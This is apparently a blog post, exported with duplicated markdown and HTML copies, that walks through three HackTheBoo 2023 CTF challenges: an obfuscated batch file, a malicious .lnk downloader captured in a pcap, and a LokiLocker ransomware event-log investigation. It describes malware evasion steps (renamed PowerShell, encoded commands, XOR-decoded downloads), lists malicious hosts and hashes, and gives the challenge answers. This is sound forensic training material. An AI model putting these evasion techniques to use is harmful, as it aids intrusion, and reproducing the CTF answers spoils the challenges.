Writeup","ShowPostNavLinks":true,"ShowToc":true,"top_img":"/images/cyberpunk-red.jpg","_content":"\n![](https://i.imgur.com/GMsEYt3.png)\n\nHi 👋, in this article i'll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn't touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting. \n\nHope you have a nice read 😅\n\n\n## Bat Problems\n\n### Explanation\nWe are given the following file:\n* `payload.bat`: Malicious bat file.\n\nAs we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).\n\n![](https://i.imgur.com/6Ila1bK.png)\n\n### Solution\n\nFirst, the bat file can be analyzed using `Any.Run` which is a malware analyzer tool.\nWe will get the following result if we upload the sample on the aforementioned site.\n\n![](https://i.imgur.com/qHgSgit.png)\n\nBy analyzing the behavior graph, we notice three actions made:\n1. The attacker can be seen using `cmd` to copy PowerShell to a different path with a random name (Earttxmxaqr.png). \n1. The attacker then uses cmd again to rename the downloaded bat file and also change it's extension to `.png.bat` to avoid detection.\n1. The attacker executes the base64 encoded string using the renamed PowerShell executable (`-enc` argument in Powershell is used to pass a base64 encoded command).\n\n![](https://i.imgur.com/TnYjjwM.png)\n\nBy decoding the string, the flag can be retrieved.\n\n![](https://i.imgur.com/yXGbDwO.png)\n\n## Trick or Treat\n\n### Explanation\nWe are given the following file:\n* `capture.pcap`: Packet capture file\n* `trick_or_treat.lnk`: The malicious file\n\nSince the malicious file is provided by HTB, we can first gain additional information on it through `VirusTotal`, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called `windowsliveupdater.com`. We also can notice that the file is connected to a few IP addresses, mainly `209.197.3.8` which is the malicious one.\n\n![](https://i.imgur.com/2D3e9x9.png)\n\nAnalyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.\n\nAs shown in the picture below, the malicious file seems to download malicious data from `http://windowsliveupdater.com` using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (`$vurnwos`) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with `0x1d` on each character and the output is appended to the `$vurnwos` string. Finally, it executes the variable using `Invoke-Command`. It also attempts to execute an empty variable (`$asvods`).\n\n![](https://i.imgur.com/CCvPfrn.png)\n\nAfter knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter `HTTP` packets only.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf4.png)\n\nGoing through the HTTP packets, we find a packet that shows the victim sending a GET request to `http://windowsliveupdater.com`. Analyzing the `User-Agent`, we can see that it is one of the randomized user agents set in the malicious file.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf5.png)\n\nNow we know that that the IP address `77.74.198.52` is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf6.png)\n\n![](https://i.imgur.com/DcWJVAU.png)\n\n\n### Solution\nSince we know that the downloable content is encoded in hex and also XOR'ed using this key `0x1d`, we can use `CyberChef` to extract the content.\n\n![](https://i.imgur.com/kk8AUa1.png)\n\n## ValHalloween \n\n### Explanation\nWe are given the following file:\n* `Logs`: Directory containing various Windows XML EventLog (.evtx) files\n\nIn this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.\n\n### Solution\n1. What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)\n* Answer: `103.162.14.116:8888`\n\nTo complete this question, we can analyze the `Security` log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware ('mscalc.exe') from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20/9/2023.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win2.png)\n\n2. According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)\n* Answer: `B94F3FF666D9781CB69088658CD53772`\n\nTo complete this question, we can analyze the `sysmon` log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win3.png)\n\n3. Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)\n* Answer: `lokilocker`\n\nTo complete this question, just put the ransomware's MD5 hash to any OSINT tool and check its family labels.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win4.png)\n\n4. What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)\n* Answer: `Loki`\n\n\nTo complete this question, we can analyze the `sysmon` log file and filter the logs with keyword 'schtasks' which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win5.png)\n\n5. What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)\n* Answer: `powershell.exe_3856`\n\nTo complete this question, we can analyze the `sysmon` log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win6.png)\n\n6. Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\\Data\\KCorp\\FirstStage.pdf)\n* Answer: `C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx`\n\nTo complete this question, we can analyze the `Security` log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious `.docx` file\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win7.png)\n\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win8.png)\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win9.png)\n\n7. When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)\n* Answer: `2023-09-20_03:03:20`\n\nTo complete this question, we can just view the XML format of the `.docx` file and find the `TimeCreated SystemTime` row. ENSURE THE TIME FORMAT IS IN UTC!\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win10.png)\n","source":"_posts/hacktheboo2023-ctf/forensics.md","raw":"---\ntitle: \"Hacktheboo 2023 CTF\"\ndate: 2023-10-23T17:21:14+03:00\ndraft: false\ntags: [\"ctf\"]\nShowReadingTime: true\ndescription: \"Challenges Writeup\"\nShowPostNavLinks: true\nShowToc: true\ntop_img: /images/cyberpunk-red.jpg\n---\n\n![](https://i.imgur.com/GMsEYt3.png)\n\nHi 👋, in this article i'll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn't touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting. \n\nHope you have a nice read 😅\n\n\n## Bat Problems\n\n### Explanation\nWe are given the following file:\n* `payload.bat`: Malicious bat file.\n\nAs we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).\n\n![](https://i.imgur.com/6Ila1bK.png)\n\n### Solution\n\nFirst, the bat file can be analyzed using `Any.Run` which is a malware analyzer tool.\nWe will get the following result if we upload the sample on the aforementioned site.\n\n![](https://i.imgur.com/qHgSgit.png)\n\nBy analyzing the behavior graph, we notice three actions made:\n1. The attacker can be seen using `cmd` to copy PowerShell to a different path with a random name (Earttxmxaqr.png). \n1. The attacker then uses cmd again to rename the downloaded bat file and also change it's extension to `.png.bat` to avoid detection.\n1. The attacker executes the base64 encoded string using the renamed PowerShell executable (`-enc` argument in Powershell is used to pass a base64 encoded command).\n\n![](https://i.imgur.com/TnYjjwM.png)\n\nBy decoding the string, the flag can be retrieved.\n\n![](https://i.imgur.com/yXGbDwO.png)\n\n## Trick or Treat\n\n### Explanation\nWe are given the following file:\n* `capture.pcap`: Packet capture file\n* `trick_or_treat.lnk`: The malicious file\n\nSince the malicious file is provided by HTB, we can first gain additional information on it through `VirusTotal`, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called `windowsliveupdater.com`. We also can notice that the file is connected to a few IP addresses, mainly `209.197.3.8` which is the malicious one.\n\n![](https://i.imgur.com/2D3e9x9.png)\n\nAnalyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.\n\nAs shown in the picture below, the malicious file seems to download malicious data from `http://windowsliveupdater.com` using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (`$vurnwos`) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with `0x1d` on each character and the output is appended to the `$vurnwos` string. Finally, it executes the variable using `Invoke-Command`. It also attempts to execute an empty variable (`$asvods`).\n\n![](https://i.imgur.com/CCvPfrn.png)\n\nAfter knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter `HTTP` packets only.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf4.png)\n\nGoing through the HTTP packets, we find a packet that shows the victim sending a GET request to `http://windowsliveupdater.com`. Analyzing the `User-Agent`, we can see that it is one of the randomized user agents set in the malicious file.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf5.png)\n\nNow we know that that the IP address `77.74.198.52` is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf6.png)\n\n![](https://i.imgur.com/DcWJVAU.png)\n\n\n### Solution\nSince we know that the downloable content is encoded in hex and also XOR'ed using this key `0x1d`, we can use `CyberChef` to extract the content.\n\n![](https://i.imgur.com/kk8AUa1.png)\n\n## ValHalloween \n\n### Explanation\nWe are given the following file:\n* `Logs`: Directory containing various Windows XML EventLog (.evtx) files\n\nIn this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.\n\n### Solution\n1. What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)\n* Answer: `103.162.14.116:8888`\n\nTo complete this question, we can analyze the `Security` log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware ('mscalc.exe') from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20/9/2023.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win2.png)\n\n2. According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)\n* Answer: `B94F3FF666D9781CB69088658CD53772`\n\nTo complete this question, we can analyze the `sysmon` log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win3.png)\n\n3. Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)\n* Answer: `lokilocker`\n\nTo complete this question, just put the ransomware's MD5 hash to any OSINT tool and check its family labels.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win4.png)\n\n4. What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)\n* Answer: `Loki`\n\n\nTo complete this question, we can analyze the `sysmon` log file and filter the logs with keyword 'schtasks' which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win5.png)\n\n5. What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)\n* Answer: `powershell.exe_3856`\n\nTo complete this question, we can analyze the `sysmon` log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win6.png)\n\n6. Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\\Data\\KCorp\\FirstStage.pdf)\n* Answer: `C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx`\n\nTo complete this question, we can analyze the `Security` log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious `.docx` file\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win7.png)\n\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win8.png)\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win9.png)\n\n7. When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)\n* Answer: `2023-09-20_03:03:20`\n\nTo complete this question, we can just view the XML format of the `.docx` file and find the `TimeCreated SystemTime` row. ENSURE THE TIME FORMAT IS IN UTC!\n\n![](https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win10.png)\n","slug":"hacktheboo2023-ctf/forensics","published":1,"updated":"2024-07-16T20:38:10.190Z","_id":"clyouz1iy0007wgjne6cb5apx","comments":1,"layout":"post","photos":[],"content":"<p><img src=\"https://i.imgur.com/GMsEYt3.png\"></p>\n<p>Hi 👋, in this article i’ll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn’t touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting. </p>\n<p>Hope you have a nice read 😅</p>\n<h2 id=\"Bat-Problems\"><a href=\"#Bat-Problems\" class=\"headerlink\" title=\"Bat Problems\"></a>Bat Problems</h2><h3 id=\"Explanation\"><a href=\"#Explanation\" class=\"headerlink\" title=\"Explanation\"></a>Explanation</h3><p>We are given the following file:</p>\n<ul>\n<li><code>payload.bat</code>: Malicious bat file.</li>\n</ul>\n<p>As we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).</p>\n<p><img src=\"https://i.imgur.com/6Ila1bK.png\"></p>\n<h3 id=\"Solution\"><a href=\"#Solution\" class=\"headerlink\" title=\"Solution\"></a>Solution</h3><p>First, the bat file can be analyzed using <code>Any.Run</code> which is a malware analyzer tool.<br>We will get the following result if we upload the sample on the aforementioned site.</p>\n<p><img src=\"https://i.imgur.com/qHgSgit.png\"></p>\n<p>By analyzing the behavior graph, we notice three actions made:</p>\n<ol>\n<li>The attacker can be seen using <code>cmd</code> to copy PowerShell to a different path with a random name (Earttxmxaqr.png). </li>\n<li>The attacker then uses cmd again to rename the downloaded bat file and also change it’s extension to <code>.png.bat</code> to avoid detection.</li>\n<li>The attacker executes the base64 encoded string using the renamed PowerShell executable (<code>-enc</code> argument in Powershell is used to pass a base64 encoded command).</li>\n</ol>\n<p><img src=\"https://i.imgur.com/TnYjjwM.png\"></p>\n<p>By decoding the string, the flag can be retrieved.</p>\n<p><img src=\"https://i.imgur.com/yXGbDwO.png\"></p>\n<h2 id=\"Trick-or-Treat\"><a href=\"#Trick-or-Treat\" class=\"headerlink\" title=\"Trick or Treat\"></a>Trick or Treat</h2><h3 id=\"Explanation-1\"><a href=\"#Explanation-1\" class=\"headerlink\" title=\"Explanation\"></a>Explanation</h3><p>We are given the following file:</p>\n<ul>\n<li><code>capture.pcap</code>: Packet capture file</li>\n<li><code>trick_or_treat.lnk</code>: The malicious file</li>\n</ul>\n<p>Since the malicious file is provided by HTB, we can first gain additional information on it through <code>VirusTotal</code>, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called <code>windowsliveupdater.com</code>. We also can notice that the file is connected to a few IP addresses, mainly <code>209.197.3.8</code> which is the malicious one.</p>\n<p><img src=\"https://i.imgur.com/2D3e9x9.png\"></p>\n<p>Analyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.</p>\n<p>As shown in the picture below, the malicious file seems to download malicious data from <code>http://windowsliveupdater.com</code> using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (<code>$vurnwos</code>) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with <code>0x1d</code> on each character and the output is appended to the <code>$vurnwos</code> string. Finally, it executes the variable using <code>Invoke-Command</code>. It also attempts to execute an empty variable (<code>$asvods</code>).</p>\n<p><img src=\"https://i.imgur.com/CCvPfrn.png\"></p>\n<p>After knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter <code>HTTP</code> packets only.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf4.png\"></p>\n<p>Going through the HTTP packets, we find a packet that shows the victim sending a GET request to <code>http://windowsliveupdater.com</code>. Analyzing the <code>User-Agent</code>, we can see that it is one of the randomized user agents set in the malicious file.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf5.png\"></p>\n<p>Now we know that that the IP address <code>77.74.198.52</code> is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf6.png\"></p>\n<p><img src=\"https://i.imgur.com/DcWJVAU.png\"></p>\n<h3 id=\"Solution-1\"><a href=\"#Solution-1\" class=\"headerlink\" title=\"Solution\"></a>Solution</h3><p>Since we know that the downloable content is encoded in hex and also XOR’ed using this key <code>0x1d</code>, we can use <code>CyberChef</code> to extract the content.</p>\n<p><img src=\"https://i.imgur.com/kk8AUa1.png\"></p>\n<h2 id=\"ValHalloween\"><a href=\"#ValHalloween\" class=\"headerlink\" title=\"ValHalloween\"></a>ValHalloween</h2><h3 id=\"Explanation-2\"><a href=\"#Explanation-2\" class=\"headerlink\" title=\"Explanation\"></a>Explanation</h3><p>We are given the following file:</p>\n<ul>\n<li><code>Logs</code>: Directory containing various Windows XML EventLog (.evtx) files</li>\n</ul>\n<p>In this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.</p>\n<h3 id=\"Solution-2\"><a href=\"#Solution-2\" class=\"headerlink\" title=\"Solution\"></a>Solution</h3><ol>\n<li>What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)</li>\n</ol>\n<ul>\n<li>Answer: <code>103.162.14.116:8888</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>Security</code> log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware (‘mscalc.exe’) from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20&#x2F;9&#x2F;2023.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win2.png\"></p>\n<ol start=\"2\">\n<li>According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)</li>\n</ol>\n<ul>\n<li>Answer: <code>B94F3FF666D9781CB69088658CD53772</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>sysmon</code> log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win3.png\"></p>\n<ol start=\"3\">\n<li>Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)</li>\n</ol>\n<ul>\n<li>Answer: <code>lokilocker</code></li>\n</ul>\n<p>To complete this question, just put the ransomware’s MD5 hash to any OSINT tool and check its family labels.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win4.png\"></p>\n<ol start=\"4\">\n<li>What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)</li>\n</ol>\n<ul>\n<li>Answer: <code>Loki</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>sysmon</code> log file and filter the logs with keyword ‘schtasks’ which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win5.png\"></p>\n<ol start=\"5\">\n<li>What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)</li>\n</ol>\n<ul>\n<li>Answer: <code>powershell.exe_3856</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>sysmon</code> log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win6.png\"></p>\n<ol start=\"6\">\n<li>Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\\Data\\KCorp\\FirstStage.pdf)</li>\n</ol>\n<ul>\n<li>Answer: <code>C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>Security</code> log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious <code>.docx</code> file</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win7.png\"></p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win8.png\"></p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win9.png\"></p>\n<ol start=\"7\">\n<li>When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)</li>\n</ol>\n<ul>\n<li>Answer: <code>2023-09-20_03:03:20</code></li>\n</ul>\n<p>To complete this question, we can just view the XML format of the <code>.docx</code> file and find the <code>TimeCreated SystemTime</code> row. ENSURE THE TIME FORMAT IS IN UTC!</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win10.png\"></p>\n","cover":false,"excerpt":"","more":"<p><img src=\"https://i.imgur.com/GMsEYt3.png\"></p>\n<p>Hi 👋, in this article i’ll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn’t touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting. </p>\n<p>Hope you have a nice read 😅</p>\n<h2 id=\"Bat-Problems\"><a href=\"#Bat-Problems\" class=\"headerlink\" title=\"Bat Problems\"></a>Bat Problems</h2><h3 id=\"Explanation\"><a href=\"#Explanation\" class=\"headerlink\" title=\"Explanation\"></a>Explanation</h3><p>We are given the following file:</p>\n<ul>\n<li><code>payload.bat</code>: Malicious bat file.</li>\n</ul>\n<p>As we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).</p>\n<p><img src=\"https://i.imgur.com/6Ila1bK.png\"></p>\n<h3 id=\"Solution\"><a href=\"#Solution\" class=\"headerlink\" title=\"Solution\"></a>Solution</h3><p>First, the bat file can be analyzed using <code>Any.Run</code> which is a malware analyzer tool.<br>We will get the following result if we upload the sample on the aforementioned site.</p>\n<p><img src=\"https://i.imgur.com/qHgSgit.png\"></p>\n<p>By analyzing the behavior graph, we notice three actions made:</p>\n<ol>\n<li>The attacker can be seen using <code>cmd</code> to copy PowerShell to a different path with a random name (Earttxmxaqr.png). </li>\n<li>The attacker then uses cmd again to rename the downloaded bat file and also change it’s extension to <code>.png.bat</code> to avoid detection.</li>\n<li>The attacker executes the base64 encoded string using the renamed PowerShell executable (<code>-enc</code> argument in Powershell is used to pass a base64 encoded command).</li>\n</ol>\n<p><img src=\"https://i.imgur.com/TnYjjwM.png\"></p>\n<p>By decoding the string, the flag can be retrieved.</p>\n<p><img src=\"https://i.imgur.com/yXGbDwO.png\"></p>\n<h2 id=\"Trick-or-Treat\"><a href=\"#Trick-or-Treat\" class=\"headerlink\" title=\"Trick or Treat\"></a>Trick or Treat</h2><h3 id=\"Explanation-1\"><a href=\"#Explanation-1\" class=\"headerlink\" title=\"Explanation\"></a>Explanation</h3><p>We are given the following file:</p>\n<ul>\n<li><code>capture.pcap</code>: Packet capture file</li>\n<li><code>trick_or_treat.lnk</code>: The malicious file</li>\n</ul>\n<p>Since the malicious file is provided by HTB, we can first gain additional information on it through <code>VirusTotal</code>, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called <code>windowsliveupdater.com</code>. We also can notice that the file is connected to a few IP addresses, mainly <code>209.197.3.8</code> which is the malicious one.</p>\n<p><img src=\"https://i.imgur.com/2D3e9x9.png\"></p>\n<p>Analyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.</p>\n<p>As shown in the picture below, the malicious file seems to download malicious data from <code>http://windowsliveupdater.com</code> using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable (<code>$vurnwos</code>) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with <code>0x1d</code> on each character and the output is appended to the <code>$vurnwos</code> string. Finally, it executes the variable using <code>Invoke-Command</code>. It also attempts to execute an empty variable (<code>$asvods</code>).</p>\n<p><img src=\"https://i.imgur.com/CCvPfrn.png\"></p>\n<p>After knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter <code>HTTP</code> packets only.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf4.png\"></p>\n<p>Going through the HTTP packets, we find a packet that shows the victim sending a GET request to <code>http://windowsliveupdater.com</code>. Analyzing the <code>User-Agent</code>, we can see that it is one of the randomized user agents set in the malicious file.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf5.png\"></p>\n<p>Now we know that that the IP address <code>77.74.198.52</code> is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/ctf6.png\"></p>\n<p><img src=\"https://i.imgur.com/DcWJVAU.png\"></p>\n<h3 id=\"Solution-1\"><a href=\"#Solution-1\" class=\"headerlink\" title=\"Solution\"></a>Solution</h3><p>Since we know that the downloable content is encoded in hex and also XOR’ed using this key <code>0x1d</code>, we can use <code>CyberChef</code> to extract the content.</p>\n<p><img src=\"https://i.imgur.com/kk8AUa1.png\"></p>\n<h2 id=\"ValHalloween\"><a href=\"#ValHalloween\" class=\"headerlink\" title=\"ValHalloween\"></a>ValHalloween</h2><h3 id=\"Explanation-2\"><a href=\"#Explanation-2\" class=\"headerlink\" title=\"Explanation\"></a>Explanation</h3><p>We are given the following file:</p>\n<ul>\n<li><code>Logs</code>: Directory containing various Windows XML EventLog (.evtx) files</li>\n</ul>\n<p>In this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.</p>\n<h3 id=\"Solution-2\"><a href=\"#Solution-2\" class=\"headerlink\" title=\"Solution\"></a>Solution</h3><ol>\n<li>What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)</li>\n</ol>\n<ul>\n<li>Answer: <code>103.162.14.116:8888</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>Security</code> log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware (‘mscalc.exe’) from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20&#x2F;9&#x2F;2023.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win2.png\"></p>\n<ol start=\"2\">\n<li>According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)</li>\n</ol>\n<ul>\n<li>Answer: <code>B94F3FF666D9781CB69088658CD53772</code></li>\n</ul>\n<p>To complete this question, we can analyze the <code>sysmon</code> log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.</p>\n<p><img src=\"https://github.com/warlocksmurf/hacktheboo2023-ctf/raw/main/images/win3.png\"></p>\n<ol start=\"3\">\n<li>Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)</li>\n</ol>\n<ul>\n<li>Answer: 